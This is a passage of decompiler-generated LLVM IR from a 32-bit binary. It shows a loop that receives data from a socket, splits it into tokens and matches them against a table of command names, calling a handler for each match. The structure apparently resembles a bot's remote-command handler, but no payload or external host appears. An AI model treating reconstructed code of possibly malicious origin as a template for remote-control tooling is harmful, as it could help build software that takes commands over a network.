  %v2_8049a4a = mul i32 %storemerge15174, 4
  %v5_8049a4f = add i32 %v2_8049a4a, %v1_8049a33
  store i32 %v5_8049a4f, i32* %ecx.global-to-local, align 4
  store i32 %v2_8049a4a, i32* %edx.global-to-local, align 4
  %v0_8049a5a = load i32, i32* @global_var_8056a2c.257, align 4
  %v2_8049a5f = add i32 %v0_8049a5a, %v2_8049a4a
  store i32 %v2_8049a5f, i32* %eax.global-to-local, align 4
  %v1_8049a62 = inttoptr i32 %v2_8049a5f to i32*
  %v2_8049a62 = load i32, i32* %v1_8049a62, align 4
  %v2_8049a64 = inttoptr i32 %v5_8049a4f to i32*
  store i32 %v2_8049a62, i32* %v2_8049a64, align 4
  %v4_8049a66 = add i32 %storemerge15174, 1
  %v0_8049a69 = load i32, i32* @global_var_8054390.256, align 16
  store i32 %v0_8049a69, i32* %eax.global-to-local, align 4
  %v10_8049a6e = icmp ult i32 %v4_8049a66, %v0_8049a69
  br i1 %v10_8049a6e, label %dec_label_pc_8049a47, label %dec_label_pc_8049a69.dec_label_pc_8049a73_crit_edge

dec_label_pc_8049a69.dec_label_pc_8049a73_crit_edge: ; preds = %dec_label_pc_8049a47
  %v0_8049a78.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049a73

dec_label_pc_8049a73:                             ; preds = %dec_label_pc_8049a00, %dec_label_pc_8049a69.dec_label_pc_8049a73_crit_edge
  %v0_8049a78 = phi i32 [ %v0_8049a78.pre, %dec_label_pc_8049a69.dec_label_pc_8049a73_crit_edge ], [ %v1_8049a38, %dec_label_pc_8049a00 ]
  %storemerge15.lcssa = phi i32 [ %v4_8049a66, %dec_label_pc_8049a69.dec_label_pc_8049a73_crit_edge ], [ 0, %dec_label_pc_8049a00 ]
  %v0_8049a73 = load i32, i32* @global_var_8056a2c.257, align 4
  store i32 %v0_8049a73, i32* %eax.global-to-local, align 4
  %v5_8049a78 = icmp ult i32 %v0_8049a78, 12
  store i1 %v5_8049a78, i1* %cf.global-to-local, align 1
  %v2_8049a7b = add i32 %v0_8049a78, -16
  %v3_8049a7b = inttoptr i32 %v2_8049a7b to i32*
  store i32 %v0_8049a73, i32* %v3_8049a7b, align 4
  %v1_8049a7c = call i32 @free(i32 %storemerge15.lcssa)
  %v0_8049a81 = load i32, i32* @esp, align 4
  %v2_8049a81 = icmp ugt i32 %v0_8049a81, -17
  store i1 %v2_8049a81, i1* %cf.global-to-local, align 1
  store i32 %v1_8049a33, i32* %eax.global-to-local, align 4
  store i32 %v1_8049a33, i32* @global_var_8056a2c.257, align 4
  br label %dec_label_pc_8049a8c

dec_label_pc_8049a8c:                             ; preds = %dec_label_pc_8049999, %dec_label_pc_8049a73
  %v0_8049ac753.in = phi i32 [ %v0_8049a81, %dec_label_pc_8049a73 ], [ %v0_80499b8, %dec_label_pc_8049999 ]
  %stack_var_-40.2 = phi i32 [ %v1_8049a33, %dec_label_pc_8049a73 ], [ %stack_var_-40.3180, %dec_label_pc_8049999 ]
  %v0_8049ac753 = add i32 %v0_8049ac753.in, 16
  %v0_8049a8f = load i32, i32* @global_var_8054390.256, align 16
  store i32 %v0_8049a8f, i32* %eax.global-to-local, align 4
  %v10_8049a94 = icmp ult i32 %.pre, %v0_8049a8f
  store i1 %v10_8049a94, i1* %cf.global-to-local, align 1
  br i1 %v10_8049a94, label %dec_label_pc_8049999, label %dec_label_pc_8049a9d

dec_label_pc_8049a9d:                             ; preds = %dec_label_pc_8049a8c, %dec_label_pc_8049a8f.preheader
  %v0_80499ab.lcssa = phi i32 [ %v1_8049982, %dec_label_pc_8049a8f.preheader ], [ %v0_8049ac753, %dec_label_pc_8049a8c ]
  %stack_var_-40.3.lcssa = phi i32 [ %stack_var_-40.1, %dec_label_pc_8049a8f.preheader ], [ %stack_var_-40.2, %dec_label_pc_8049a8c ]
  %storemerge14.lcssa = phi i32 [ 0, %dec_label_pc_8049a8f.preheader ], [ %.pre, %dec_label_pc_8049a8c ]
  %v0_8049a9d = load i32, i32* @global_var_8056a14.284, align 4
  %v1_8049aa4 = urem i32 %v0_8049a9d, 32
  store i32 %v1_8049aa4, i32* %edx.global-to-local, align 4
  %v2_8049aac = udiv i32 %v0_8049a9d, 32
  store i32 %v2_8049aac, i32* %eax.global-to-local, align 4
  %v0_8049aaf = load i32, i32* @ebp, align 4
  %v2_8049aaf = mul nuw nsw i32 %v2_8049aac, 4
  %v3_8049aaf = add nsw i32 %v2_8049aaf, -656
  %v4_8049aaf = add i32 %v3_8049aaf, %v0_8049aaf
  %v5_8049aaf = inttoptr i32 %v4_8049aaf to i32*
  %v6_8049aaf = load i32, i32* %v5_8049aaf, align 4
  %v9_8049aaf = shl i32 1, %v1_8049aa4
  %v10_8049aaf = and i32 %v6_8049aaf, %v9_8049aaf
  %v11_8049aaf = icmp ne i32 %v10_8049aaf, 0
  %v1_8049ab7 = zext i1 %v11_8049aaf to i32
  %v3_8049ab7 = and i32 %v2_8049aac, 134217472
  %v4_8049ab7 = or i32 %v1_8049ab7, %v3_8049ab7
  store i32 %v4_8049ab7, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8049aba = icmp eq i1 %v11_8049aaf, false
  br i1 %v4_8049aba, label %dec_label_pc_8049918, label %dec_label_pc_8049ac2

dec_label_pc_8049ac2:                             ; preds = %dec_label_pc_8049a9d
  store i32 %v0_8049a9d, i32* %eax.global-to-local, align 4
  %v1_8049ac7 = add i32 %v0_80499ab.lcssa, -4
  %v2_8049ac7 = inttoptr i32 %v1_8049ac7 to i32*
  store i32 0, i32* %v2_8049ac7, align 4
  %v1_8049ac9 = add i32 %v0_80499ab.lcssa, -8
  %v2_8049ac9 = inttoptr i32 %v1_8049ac9 to i32*
  store i32 4096, i32* %v2_8049ac9, align 4
  store i32 %v2_8049ace, i32* %edx.global-to-local, align 4
  %v2_8049ad4 = add i32 %v0_80499ab.lcssa, -12
  %v3_8049ad4 = inttoptr i32 %v2_8049ad4 to i32*
  store i32 %v2_8049ace, i32* %v3_8049ad4, align 4
  %v0_8049ad5 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049ad5 = add i32 %v0_80499ab.lcssa, -16
  %v3_8049ad5 = inttoptr i32 %v2_8049ad5 to i32*
  store i32 %v0_8049ad5, i32* %v3_8049ad5, align 4
  %v4_8049ad6 = call i32 @__libc_recv(i32 %storemerge14.lcssa, i32 %v6_8049929, i32 %v2_8049922, i32 %stack_var_-40.3.lcssa)
  store i32 %v4_8049ad6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp142 = icmp slt i32 %v4_8049ad6, 1
  br i1 %tmp142, label %dec_label_pc_80498c9, label %dec_label_pc_8049aeb

dec_label_pc_8049aeb:                             ; preds = %dec_label_pc_8049ac2
  %v0_8049aee = load i32, i32* @ebp, align 4
  %v2_8049aee = add i32 %v4_8049ad6, -6800
  %v3_8049aee = add i32 %v2_8049aee, %v0_8049aee
  %v4_8049aee = inttoptr i32 %v3_8049aee to i8*
  store i8 0, i8* %v4_8049aee, align 1
  %v0_8049af6 = load i32, i32* @esp, align 4
  %v5_8049af6 = icmp ult i32 %v0_8049af6, 8
  store i1 %v5_8049af6, i1* %cf.global-to-local, align 1
  %v1_8049af9 = add i32 %v0_8049af6, -12
  %v2_8049af9 = inttoptr i32 %v1_8049af9 to i32*
  store i32 ptrtoint (i32* @global_var_8051289.302 to i32), i32* %v2_8049af9, align 4
  store i32 %v2_8049ace, i32* @eax, align 4
  %v2_8049b04 = add i32 %v0_8049af6, -16
  %v3_8049b04 = inttoptr i32 %v2_8049b04 to i32*
  store i32 %v2_8049ace, i32* %v3_8049b04, align 4
  %v1_8049b05 = call i32 @__GI_strtok(i32 %v4_8049ad6)
  store i32 %v1_8049b05, i32* %eax.global-to-local, align 4
  %v0_8049b0a = load i32, i32* @esp, align 4
  %v5_8049b0d = inttoptr i32 %v1_8049b05 to i8*
  store i8* %v5_8049b0d, i8** %stack_var_-32, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_8049cac31 = icmp eq i32 %v1_8049b05, 0
  br i1 %v5_8049cac31, label %dec_label_pc_8049918.outer, label %dec_label_pc_8049cb6

dec_label_pc_8049b15:                             ; preds = %dec_label_pc_8049cb6
  %v6_8049b15 = add i32 %v5_8049b15.in, 12
  %v7_8049b15 = inttoptr i32 %v6_8049b15 to i32*
  store i32 %v4_8049cb6, i32* %v7_8049b15, align 4
  %v0_8049b18 = load i8*, i8** %stack_var_-32, align 4
  %v3_8049b18 = call i32 @filter(i8* %v0_8049b18)
  %v0_8049b1d = load i32, i32* @esp, align 4
  %v5_8049b1d = icmp ugt i32 %v0_8049b1d, -5
  store i1 %v5_8049b1d, i1* %cf.global-to-local, align 1
  %v4_8049b20 = ptrtoint i8* %v0_8049b18 to i32
  store i32 %v4_8049b20, i32* %eax.global-to-local, align 4
  %v2_8049b23 = load i8, i8* %v0_8049b18, align 1
  %v3_8049b23 = zext i8 %v2_8049b23 to i32
  %v5_8049b23 = and i32 %v4_8049b20, -256
  %v6_8049b23 = or i32 %v3_8049b23, %v5_8049b23
  store i32 %v6_8049b23, i32* %eax.global-to-local, align 4
  %v6_8049b25 = icmp ult i8 %v2_8049b23, 58
  store i1 %v6_8049b25, i1* %cf.global-to-local, align 1
  %v10_8049b25 = icmp eq i8 %v2_8049b23, 58
  %v1_8049b27 = icmp eq i1 %v10_8049b25, false
  br i1 %v1_8049b27, label %dec_label_pc_8049b9e, label %dec_label_pc_8049b35

dec_label_pc_8049b32:                             ; preds = %dec_label_pc_8049b5a
  %v4_8049b32 = add i32 %storemerge13, 1
  br label %dec_label_pc_8049b35

dec_label_pc_8049b35:                             ; preds = %dec_label_pc_8049b15, %dec_label_pc_8049b32
  %storemerge13 = phi i32 [ %v4_8049b32, %dec_label_pc_8049b32 ], [ 0, %dec_label_pc_8049b15 ]
  store i32 %storemerge13, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v5_8049b23, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v3_8049b4f = call i32 @_strlen(i8* %v0_8049b18)
  %v4_8049b4f = mul i32 %v3_8049b4f, -1
  %v5_8049b4f = add i32 %v4_8049b4f, -2
  store i32 %v5_8049b4f, i32* %ecx.global-to-local, align 4
  %v1_8049b55 = sub i32 0, %v4_8049b4f
  store i32 %v1_8049b55, i32* %eax.global-to-local, align 4
  %v0_8049b56 = load i32, i32* %edx.global-to-local, align 4
  %v7_8049b56 = icmp ult i32 %v0_8049b56, %v1_8049b55
  store i1 %v7_8049b56, i1* %cf.global-to-local, align 1
  %v1_8049b58 = icmp eq i1 %v7_8049b56, false
  %.pre74 = add i32 %storemerge13, %v4_8049b20
  br i1 %v1_8049b58, label %dec_label_pc_8049b35.dec_label_pc_8049b66_crit_edge, label %dec_label_pc_8049b5a

dec_label_pc_8049b35.dec_label_pc_8049b66_crit_edge: ; preds = %dec_label_pc_8049b35
  %.pre81 = inttoptr i32 %.pre74 to i8*
  br label %dec_label_pc_8049b66

dec_label_pc_8049b5a:                             ; preds = %dec_label_pc_8049b35
  %v11_8049b5d = icmp ult i32 %.pre74, %storemerge13
  store i1 %v11_8049b5d, i1* %cf.global-to-local, align 1
  store i32 %.pre74, i32* %eax.global-to-local, align 4
  %v1_8049b60 = inttoptr i32 %.pre74 to i8*
  %v2_8049b60 = load i8, i8* %v1_8049b60, align 1
  %v3_8049b60 = zext i8 %v2_8049b60 to i32
  %v5_8049b60 = and i32 %.pre74, -256
  %v6_8049b60 = or i32 %v3_8049b60, %v5_8049b60
  store i32 %v6_8049b60, i32* %eax.global-to-local, align 4
  %v3_8049b62 = icmp ult i8 %v2_8049b60, 32
  store i1 %v3_8049b62, i1* %cf.global-to-local, align 1
  %v7_8049b62 = icmp eq i8 %v2_8049b60, 32
  %v1_8049b64 = icmp eq i1 %v7_8049b62, false
  br i1 %v1_8049b64, label %dec_label_pc_8049b32, label %dec_label_pc_8049b66

dec_label_pc_8049b66:                             ; preds = %dec_label_pc_8049b5a, %dec_label_pc_8049b35.dec_label_pc_8049b66_crit_edge
  %v1_8049b6c.pre-phi = phi i8* [ %.pre81, %dec_label_pc_8049b35.dec_label_pc_8049b66_crit_edge ], [ %v1_8049b60, %dec_label_pc_8049b5a ]
  store i8 0, i8* %v1_8049b6c.pre-phi, align 1
  %v3_8049b6f = load i8*, i8** %stack_var_-32, align 4
  %v4_8049b6f = ptrtoint i8* %v3_8049b6f to i32
  %v1_8049b72 = add i32 %v4_8049b6f, 1
  %v0_8049b73 = load i32, i32* @esp, align 4
  %v5_8049b73 = icmp ult i32 %v0_8049b73, 8
  store i1 %v5_8049b73, i1* %cf.global-to-local, align 1
  %v2_8049b76 = add i32 %v0_8049b73, -12
  %v3_8049b76 = inttoptr i32 %v2_8049b76 to i32*
  store i32 %v1_8049b72, i32* %v3_8049b76, align 4
  store i32 %v2_8049b9e, i32* @eax, align 4
  %v2_8049b7d = add i32 %v0_8049b73, -16
  %v3_8049b7d = inttoptr i32 %v2_8049b7d to i32*
  store i32 %v2_8049b9e, i32* %v3_8049b7d, align 4
  %v4_8049b7e = call i32 @strcpy(i8* %v0_8049b18, i32 %stack_var_-6836.0.lcssa)
  %v0_8049b83 = load i32, i32* @esp, align 4
  %v4_8049b89 = load i8*, i8** %stack_var_-32, align 4
  %v5_8049b89 = ptrtoint i8* %v4_8049b89 to i32
  %v6_8049b89 = add i32 %storemerge13, 1
  %v1_8049b8c = add i32 %v6_8049b89, %v5_8049b89
  store i32 %v1_8049b8c, i32* @eax, align 4
  %tmp216 = and i32 %v0_8049b83, -8
  %v5_8049b8d = icmp eq i32 %tmp216, -16
  store i1 %v5_8049b8d, i1* %cf.global-to-local, align 1
  %v2_8049b90 = add i32 %v0_8049b83, 4
  %v3_8049b90 = inttoptr i32 %v2_8049b90 to i32*
  store i32 %v1_8049b8c, i32* %v3_8049b90, align 4
  %v3_8049b91 = load i8*, i8** %stack_var_-32, align 4
  %v4_8049b91 = ptrtoint i8* %v3_8049b91 to i32
  %v7_8049b91 = inttoptr i32 %v0_8049b83 to i32*
  store i32 %v4_8049b91, i32* %v7_8049b91, align 4
  %v4_8049b94 = call i32 @strcpy(i8* %v0_8049b18, i32 %stack_var_-6836.0.lcssa)
  store i32 %v4_8049b94, i32* %eax.global-to-local, align 4
  %v0_8049b99 = load i32, i32* @esp, align 4
  %v2_8049b99 = icmp ugt i32 %v0_8049b99, -17
  store i1 %v2_8049b99, i1* %cf.global-to-local, align 1
  %v3_8049bb8.pre.pre = load i8*, i8** %stack_var_-32, align 4
  br label %dec_label_pc_8049bb5.preheader

dec_label_pc_8049b9e:                             ; preds = %dec_label_pc_8049b15
  store i32 %v2_8049b9e, i32* %eax.global-to-local, align 4
  store i32 42, i32* %stack_var_-2712, align 4
  br label %dec_label_pc_8049bb5.preheader

dec_label_pc_8049bb5.preheader:                   ; preds = %dec_label_pc_8049b66, %dec_label_pc_8049b9e
  %v3_8049bb8.pre = phi i8* [ %v3_8049bb8.pre.pre, %dec_label_pc_8049b66 ], [ %v0_8049b18, %dec_label_pc_8049b9e ]
  %stack_var_-6840.2.ph = phi i8* [ %v0_8049b18, %dec_label_pc_8049b66 ], [ %stack_var_-6840.338, %dec_label_pc_8049b9e ]
  %v4_8049bb8 = ptrtoint i8* %v3_8049bb8.pre to i32
  %v1_8049bc6 = and i32 %v4_8049bb8, -256
  br label %dec_label_pc_8049bb5

dec_label_pc_8049bb2:                             ; preds = %dec_label_pc_8049bda
  %v4_8049bb2 = add i32 %storemerge12, 1
  br label %dec_label_pc_8049bb5

dec_label_pc_8049bb5:                             ; preds = %dec_label_pc_8049bb5.preheader, %dec_label_pc_8049bb2
  %storemerge12 = phi i32 [ %v4_8049bb2, %dec_label_pc_8049bb2 ], [ 0, %dec_label_pc_8049bb5.preheader ]
  store i32 %storemerge12, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049bc6, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8049bb8, i32* @edi, align 4
  %v3_8049bcf = call i32 @_strlen(i8* %v3_8049bb8.pre)
  %v4_8049bcf = mul i32 %v3_8049bcf, -1
  %v5_8049bcf = add i32 %v4_8049bcf, -2
  store i32 %v5_8049bcf, i32* %ecx.global-to-local, align 4
  %v1_8049bd5 = sub i32 0, %v4_8049bcf
  store i32 %v1_8049bd5, i32* %eax.global-to-local, align 4
  %v0_8049bd6 = load i32, i32* %edx.global-to-local, align 4
  %v7_8049bd6 = icmp ult i32 %v0_8049bd6, %v1_8049bd5
  store i1 %v7_8049bd6, i1* %cf.global-to-local, align 1
  %v1_8049bd8 = icmp eq i1 %v7_8049bd6, false
  %.pre66 = add i32 %storemerge12, %v4_8049bb8
  br i1 %v1_8049bd8, label %dec_label_pc_8049bb5.dec_label_pc_8049be6_crit_edge, label %dec_label_pc_8049bda

dec_label_pc_8049bb5.dec_label_pc_8049be6_crit_edge: ; preds = %dec_label_pc_8049bb5
  %.pre73 = inttoptr i32 %.pre66 to i8*
  br label %dec_label_pc_8049be6

dec_label_pc_8049bda:                             ; preds = %dec_label_pc_8049bb5
  %v11_8049bdd = icmp ult i32 %.pre66, %storemerge12
  store i1 %v11_8049bdd, i1* %cf.global-to-local, align 1
  store i32 %.pre66, i32* %eax.global-to-local, align 4
  %v1_8049be0 = inttoptr i32 %.pre66 to i8*
  %v2_8049be0 = load i8, i8* %v1_8049be0, align 1
  %v3_8049be0 = zext i8 %v2_8049be0 to i32
  %v5_8049be0 = and i32 %.pre66, -256
  %v6_8049be0 = or i32 %v3_8049be0, %v5_8049be0
  store i32 %v6_8049be0, i32* %eax.global-to-local, align 4
  %v3_8049be2 = icmp ult i8 %v2_8049be0, 32
  store i1 %v3_8049be2, i1* %cf.global-to-local, align 1
  %v7_8049be2 = icmp eq i8 %v2_8049be0, 32
  %v1_8049be4 = icmp eq i1 %v7_8049be2, false
  br i1 %v1_8049be4, label %dec_label_pc_8049bb2, label %dec_label_pc_8049be6

dec_label_pc_8049be6:                             ; preds = %dec_label_pc_8049bda, %dec_label_pc_8049bb5.dec_label_pc_8049be6_crit_edge
  %v1_8049bec.pre-phi = phi i8* [ %.pre73, %dec_label_pc_8049bb5.dec_label_pc_8049be6_crit_edge ], [ %v1_8049be0, %dec_label_pc_8049bda ]
  store i8 0, i8* %v1_8049bec.pre-phi, align 1
  %v0_8049bef = load i32, i32* @esp, align 4
  %v5_8049bef = icmp ult i32 %v0_8049bef, 8
  store i1 %v5_8049bef, i1* %cf.global-to-local, align 1
  %v3_8049bf2 = load i8*, i8** %stack_var_-32, align 4
  %v4_8049bf2 = ptrtoint i8* %v3_8049bf2 to i32
  %v6_8049bf2 = add i32 %v0_8049bef, -12
  %v7_8049bf2 = inttoptr i32 %v6_8049bf2 to i32*
  store i32 %v4_8049bf2, i32* %v7_8049bf2, align 4
  store i32 %v2_8049bf5, i32* @eax, align 4
  %v2_8049bfb = add i32 %v0_8049bef, -16
  %v3_8049bfb = inttoptr i32 %v2_8049bfb to i32*
  store i32 %v2_8049bf5, i32* %v3_8049bfb, align 4
  %v3_8049bfc = ptrtoint i8* %stack_var_-6840.2.ph to i32
  %v5_8049bfc = call i32 @strcpy(i8* %v3_8049bb8.pre, i32 %v3_8049bfc)
  %v0_8049c01 = load i32, i32* @esp, align 4
  %v4_8049c07 = load i8*, i8** %stack_var_-32, align 4
  %v5_8049c07 = ptrtoint i8* %v4_8049c07 to i32
  %v6_8049c07 = add i32 %storemerge12, 1
  %v1_8049c0a = add i32 %v6_8049c07, %v5_8049c07
  store i32 %v1_8049c0a, i32* @eax, align 4
  %tmp217 = and i32 %v0_8049c01, -8
  %v5_8049c0b = icmp eq i32 %tmp217, -16
  store i1 %v5_8049c0b, i1* %cf.global-to-local, align 1
  %v2_8049c0e = add i32 %v0_8049c01, 4
  %v3_8049c0e = inttoptr i32 %v2_8049c0e to i32*
  store i32 %v1_8049c0a, i32* %v3_8049c0e, align 4
  %v3_8049c0f = load i8*, i8** %stack_var_-32, align 4
  %v4_8049c0f = ptrtoint i8* %v3_8049c0f to i32
  %v7_8049c0f = inttoptr i32 %v0_8049c01 to i32*
  store i32 %v4_8049c0f, i32* %v7_8049c0f, align 4
  %v5_8049c12 = call i32 @strcpy(i8* %v3_8049bb8.pre, i32 %v3_8049bfc)
  %v0_8049c17 = load i32, i32* @esp, align 4
  %v1_8049c17 = add i32 %v0_8049c17, 16
  %v4_8049c6d185 = load i32, i32* bitcast ([4 x i8]** @global_var_8054080.304 to i32*), align 8
  store i32 %v4_8049c6d185, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049c74186 = icmp eq i32 %v4_8049c6d185, 0
  %v1_8049c76187 = icmp eq i1 %v1_8049c74186, false
  br i1 %v1_8049c76187, label %dec_label_pc_8049c23, label %dec_label_pc_8049c78

dec_label_pc_8049c23:                             ; preds = %dec_label_pc_8049be6, %dec_label_pc_8049c23
  %v3_8049c6d191 = phi i32* [ %v3_8049c6d, %dec_label_pc_8049c23 ], [ bitcast ([4 x i8]** @global_var_8054080.304 to i32*), %dec_label_pc_8049be6 ]
  %v1_8049c6d190 = phi i32 [ %v1_8049c6d, %dec_label_pc_8049c23 ], [ 0, %dec_label_pc_8049be6 ]
  %storemerge189 = phi i32 [ %v4_8049c67, %dec_label_pc_8049c23 ], [ 0, %dec_label_pc_8049be6 ]
  %v0_8049c2d188 = phi i32 [ %v1_8049c64, %dec_label_pc_8049c23 ], [ %v1_8049c17, %dec_label_pc_8049be6 ]
  store i32 %storemerge189, i32* %eax.global-to-local, align 4
  %v4_8049c26 = load i32, i32* %v3_8049c6d191, align 8
  store i32 %v4_8049c26, i32* %edx.global-to-local, align 4
  %v5_8049c2d = icmp ult i32 %v0_8049c2d188, 8
  store i1 %v5_8049c2d, i1* %cf.global-to-local, align 1
  store i32 %v2_8049bf5, i32* %eax.global-to-local, align 4
  %v2_8049c36 = add i32 %v0_8049c2d188, -12
  %v3_8049c36 = inttoptr i32 %v2_8049c36 to i32*
  store i32 %v2_8049bf5, i32* %v3_8049c36, align 4
  %v0_8049c37 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049c37 = add i32 %v0_8049c2d188, -16
  %v3_8049c37 = inttoptr i32 %v2_8049c37 to i32*
  store i32 %v0_8049c37, i32* %v3_8049c37, align 4
  %v2_8049c38 = inttoptr i32 %storemerge189 to i8*
  %v3_8049c38 = call i32 @__GI_strcasecmp(i8* %v2_8049c38, i32 %v2_8049552)
  %v0_8049c3d = load i32, i32* @esp, align 4
  store i32 %storemerge189, i32* %eax.global-to-local, align 4
  %v2_8049c47 = add i32 %v1_8049c6d190, ptrtoint (i32* @global_var_8054084.305 to i32)
  %v3_8049c47 = inttoptr i32 %v2_8049c47 to i32*
  %v4_8049c47 = load i32, i32* %v3_8049c47, align 4
  store i32 %v4_8049c47, i32* %ecx.global-to-local, align 4
  %v0_8049c4e = load i32, i32* @global_var_8056a14.284, align 4
  store i32 %v0_8049c4e, i32* @edx, align 4
  %tmp = and i32 %v0_8049c3d, -4
  %v5_8049c54 = icmp eq i32 %tmp, -16
  store i1 %v5_8049c54, i1* %cf.global-to-local, align 1
  %v3_8049c57 = load i8*, i8** %stack_var_-32, align 4
  %v4_8049c57 = ptrtoint i8* %v3_8049c57 to i32
  %v6_8049c57 = add i32 %v0_8049c3d, 8
  %v7_8049c57 = inttoptr i32 %v6_8049c57 to i32*
  store i32 %v4_8049c57, i32* %v7_8049c57, align 4
  store i32 %v2_8049b9e, i32* %eax.global-to-local, align 4
  %v2_8049c60 = add i32 %v0_8049c3d, 4
  %v3_8049c60 = inttoptr i32 %v2_8049c60 to i32*
  store i32 %v2_8049b9e, i32* %v3_8049c60, align 4
  %v0_8049c61 = load i32, i32* @edx, align 4
  %v3_8049c61 = inttoptr i32 %v0_8049c3d to i32*
  store i32 %v0_8049c61, i32* %v3_8049c61, align 4
  %v1_8049c62 = add i32 %v0_8049c3d, -4
  %v2_8049c62 = inttoptr i32 %v1_8049c62 to i32*
  store i32 134519908, i32* %v2_8049c62, align 4
  call void @__pseudo_call(i32 %v4_8049c47)
  %v0_8049c64 = load i32, i32* @esp, align 4
  %v1_8049c64 = add i32 %v0_8049c64, 16
  %v4_8049c67 = add i32 %storemerge189, 1
  store i32 %v4_8049c67, i32* %eax.global-to-local, align 4
  %v1_8049c6d = mul i32 %v4_8049c67, 8
  %v2_8049c6d = add i32 %v1_8049c6d, ptrtoint ([4 x i8]** @global_var_8054080.304 to i32)
  %v3_8049c6d = inttoptr i32 %v2_8049c6d to i32*
  %v4_8049c6d = load i32, i32* %v3_8049c6d, align 8
  store i32 %v4_8049c6d, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049c74 = icmp eq i32 %v4_8049c6d, 0
  %v1_8049c76 = icmp eq i1 %v1_8049c74, false
  br i1 %v1_8049c76, label %dec_label_pc_8049c23, label %dec_label_pc_8049c78

dec_label_pc_8049c78:                             ; preds = %dec_label_pc_8049c23, %dec_label_pc_8049be6
  %v0_8049c2d.lcssa = phi i32 [ %v1_8049c17, %dec_label_pc_8049be6 ], [ %v1_8049c64, %dec_label_pc_8049c23 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_8049be6 ], [ %v4_8049c67, %dec_label_pc_8049c23 ]
  %v5_8049c78 = icmp ult i32 %v0_8049c2d.lcssa, 8
  store i1 %v5_8049c78, i1* %cf.global-to-local, align 1
  %v1_8049c7b = add i32 %v0_8049c2d.lcssa, -12
  %v2_8049c7b = inttoptr i32 %v1_8049c7b to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_805128b.306 to i32), i32* %v2_8049c7b, align 4
  store i32 %v2_8049bf5, i32* %eax.global-to-local, align 4
  %v2_8049c86 = add i32 %v0_8049c2d.lcssa, -16
  %v3_8049c86 = inttoptr i32 %v2_8049c86 to i32*
  store i32 %v2_8049bf5, i32* %v3_8049c86, align 4
  %v2_8049c87 = inttoptr i32 %storemerge.lcssa to i8*
  %v3_8049c87 = call i32 @__GI_strcasecmp(i8* %v2_8049c87, i32 %v2_8049552)
  store i32 %v3_8049c87, i32* @eax, align 4
  %v0_8049c8c = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049c8f = icmp eq i32 %v3_8049c87, 0
  br i1 %v1_8049c8f, label %dec_label_pc_80498c9, label %dec_label_pc_8049c97

dec_label_pc_8049c97:                             ; preds = %dec_label_pc_8049c78
  %tmp218 = and i32 %v0_8049c8c, -8
  %v5_8049c97 = icmp eq i32 %tmp218, -16
  store i1 %v5_8049c97, i1* %cf.global-to-local, align 1
  %v1_8049c9a = add i32 %v0_8049c8c, 4
  %v2_8049c9a = inttoptr i32 %v1_8049c9a to i32*
  store i32 ptrtoint (i32* @global_var_8051289.302 to i32), i32* %v2_8049c9a, align 4
  %v2_8049c9f = inttoptr i32 %v0_8049c8c to i32*
  store i32 0, i32* %v2_8049c9f, align 4
  %v1_8049ca1 = call i32 @__GI_strtok(i32 %storemerge.lcssa)
  store i32 %v1_8049ca1, i32* %eax.global-to-local, align 4
  %v0_8049ca6 = load i32, i32* @esp, align 4
  store i32 %v1_8049ca1, i32* %tmp139, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_8049cac = icmp eq i32 %v1_8049ca1, 0
  %tmp143 = inttoptr i32 %v1_8049ca1 to i8*
  br i1 %v5_8049cac, label %dec_label_pc_8049918.outer.outer, label %dec_label_pc_8049cb6

dec_label_pc_8049cb6:                             ; preds = %dec_label_pc_8049aeb, %dec_label_pc_8049c97
  %v5_8049b15.in = phi i32 [ %v0_8049ca6, %dec_label_pc_8049c97 ], [ %v0_8049b0a, %dec_label_pc_8049aeb ]
  %v3_8049b15 = phi i8* [ %tmp143, %dec_label_pc_8049c97 ], [ %v5_8049b0d, %dec_label_pc_8049aeb ]
  %stack_var_-6840.338 = phi i8* [ %stack_var_-6840.2.ph, %dec_label_pc_8049c97 ], [ %stack_var_-6840.1.ph.ph146, %dec_label_pc_8049aeb ]
  %v4_8049cb6 = ptrtoint i8* %v3_8049b15 to i32
  store i32 %v4_8049cb6, i32* %eax.global-to-local, align 4
  %v2_8049cb9 = load i8, i8* %v3_8049b15, align 1
  %v3_8049cb9 = zext i8 %v2_8049cb9 to i32
  %v5_8049cb9 = and i32 %v4_8049cb6, -256
  %v6_8049cb9 = or i32 %v3_8049cb9, %v5_8049cb9
  store i32 %v6_8049cb9, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8049cbb = icmp eq i8 %v2_8049cb9, 0
  %v1_8049cbd = icmp eq i1 %v4_8049cbb, false
  br i1 %v1_8049cbd, label %dec_label_pc_8049b15, label %dec_label_pc_8049918.outer.outer

; uselistorder directives
  uselistorder i32 %v4_8049cb6, { 1, 2, 0 }
  uselistorder i32 %v1_8049ca1, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8049c8c, { 2, 1, 0 }
  uselistorder i32 %storemerge.lcssa, { 1, 0 }
  uselistorder i32* %v3_8049c6d, { 1, 0 }
  uselistorder i32 %v1_8049c6d, { 1, 0 }
  uselistorder i32 %v4_8049c67, { 0, 2, 3, 1 }
  uselistorder i32 %v0_8049c3d, { 1, 4, 2, 3, 0 }
  uselistorder i32 %storemerge189, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8049c01, { 2, 1, 0 }
  uselistorder i32 %.pre66, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8049bd5, { 1, 0 }
